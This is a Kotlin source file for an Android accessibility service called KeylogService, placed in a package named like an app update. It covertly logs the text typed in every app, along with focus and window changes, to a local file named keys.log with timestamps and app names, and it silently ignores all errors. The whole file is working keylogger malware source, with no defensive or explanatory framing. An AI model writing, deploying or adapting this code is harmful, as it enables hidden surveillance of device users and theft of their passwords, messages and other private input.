package com.myapp2026.update

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class KeylogService : AccessibilityService() {
    private val ts = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
    private val logFile by lazy { File(filesDir, "keys.log") }

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        e ?: return
        try {
            val pkg = e.packageName?.toString() ?: "?"
            when (e.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val text = e.text.joinToString("")
                    write("${ts.format(Date())} [$pkg] TEXT: $text\n")
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    write("${ts.format(Date())} [$pkg] FOCUS: ${e.className}\n")
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    write("${ts.format(Date())} [$pkg] WINDOW: ${e.className}\n")
                }
            }
        } catch (_: Exception) {}
    }

    private fun write(s: String) {
        try { logFile.appendText(s) } catch (_: Exception) {}
    }

    override fun onInterrupt() {}
}
